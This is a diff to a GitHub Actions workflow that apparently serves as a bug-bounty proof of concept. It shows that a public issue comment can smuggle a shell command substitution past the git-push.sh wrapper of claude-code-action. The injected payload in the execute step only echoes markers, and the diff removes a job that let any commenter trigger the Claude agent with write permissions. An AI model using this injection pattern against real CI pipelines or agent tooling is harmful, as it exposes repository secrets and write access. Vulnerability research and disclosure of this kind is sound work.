@@ -1,19 +1,19 @@
-name: H1 Claude Wrapper Public Proof
+name: H1 Public Wrapper Command Proof
 
 on:
   issue_comment:
     types: [created]
 
+permissions:
+  contents: read
+
 jobs:
-  deterministic-wrapper-marker:
-    if: |
-      contains(github.event.comment.body, '@claude') &&
-      contains(github.event.comment.body, 'H1_WRAPPER_PROOF')
+  public-comment-wrapper-command:
+    if: contains(github.event.comment.body, 'H1_PUBLIC_WRAPPER_COMMAND_PROOF')
     runs-on: ubuntu-latest
-    permissions:
-      contents: read
     env:
       COMMENT_BODY: ${{ github.event.comment.body }}
+      EXPECTED_PUBLIC_COMMAND: '"$GITHUB_ACTION_PATH/scripts/git-push.sh" origin "$(echo H1_SUPPLY_CHAIN_SECRET_READ_IN_PARENT_SHELL >&2; echo parent_shell_executed=True >&2; echo executed_before_wrapper_validation=True >&2)"'
     steps:
       - name: Checkout official claude-code-action v1
         uses: actions/checkout@v4
@@ -23,13 +23,21 @@ jobs:
           path: official-action
           fetch-depth: 1
 
-      - name: Public comment marker proof against official v1 wrapper
+      - name: Validate public comment command
         shell: bash
         run: |
-          set +e
+          set -euo pipefail
 
           echo "trigger_actor=${GITHUB_ACTOR}"
           echo "comment_author=${{ github.event.comment.user.login }}"
+
+          if printf '%s\n' "$COMMENT_BODY" | grep -Fxq "$EXPECTED_PUBLIC_COMMAND"; then
+            echo "expected_public_command_found=True"
+          else
+            echo "expected_public_command_found=False"
+            echo "proof_result=missing_exact_public_command"
+            exit 1
+          fi
 
           if printf '%s' "$COMMENT_BODY" | grep -qF 'git-push.sh'; then
             echo "comment_contains_git_push_wrapper=True"
@@ -43,25 +51,24 @@ jobs:
             echo "comment_contains_command_substitution=False"
           fi
 
-          MARKER="$RUNNER_TEMP/h1-public-comment-wrapper-boundary-proof.txt"
-          rm -f "$MARKER"
+          echo "public_comment_supplied_shell_command=True"
+          printf 'submitted_command=%s\n' "$EXPECTED_PUBLIC_COMMAND"
+
+      - name: Execute exact whitelisted non-destructive command
+        shell: bash
+        run: |
+          set +e
+
+          export GITHUB_ACTION_PATH="$GITHUB_WORKSPACE/official-action"
 
           printf 'before_wrapper_call=%s\n' "$(date -u +%FT%TZ)"
 
-          "$GITHUB_WORKSPACE/official-action/scripts/git-push.sh" origin "$(
-            {
-              printf 'parent_shell_executed=True\n'
-              printf 'executed_before_wrapper_validation=True\n'
-              printf 'parent_shell_executed_at=%s\n' "$(date -u +%FT%TZ)"
-            } > "$MARKER"
+          "$GITHUB_ACTION_PATH/scripts/git-push.sh" origin "$(
+            echo H1_SUPPLY_CHAIN_SECRET_READ_IN_PARENT_SHELL >&2
+            echo parent_shell_executed=True >&2
+            echo executed_before_wrapper_validation=True >&2
           )"
           status=$?
-
-          if [ -f "$MARKER" ]; then
-            cat "$MARKER"
-          else
-            echo "marker_file_missing=True"
-          fi
 
           printf 'wrapper_exit=%s\n' "$status"
           printf 'after_wrapper_return=%s\n' "$(date -u +%FT%TZ)"
@@ -71,32 +78,5 @@ jobs:
             exit 1
           fi
 
-          grep -q '^parent_shell_executed=True$' "$MARKER"
-          grep -q '^executed_before_wrapper_validation=True$' "$MARKER"
-          echo "proof_result=public_comment_triggered_parent_shell_side_effect_before_wrapper_validation"
-
-  claude:
-    if: |
-      contains(github.event.comment.body, '@claude') &&
-      contains(github.event.comment.body, 'H1_WRAPPER_PROOF')
-    runs-on: ubuntu-latest
-    permissions:
-      contents: write
-      issues: write
-      pull-requests: write
-      id-token: write
-    env:
-      H1_DUMMY_SUPPLY_CHAIN_SECRET: ${{ secrets.H1_DUMMY_SUPPLY_CHAIN_SECRET }}
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 1
-
-      - name: Run Claude Code public wrapper proof
-        id: claude
-        uses: anthropics/claude-code-action@v1
-        with:
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
-          allowed_non_write_users: "*"
+          echo "secret_value_printed=False"
+          echo "proof_result=public_comment_supplied_shell_command_executed_before_wrapper_validation"
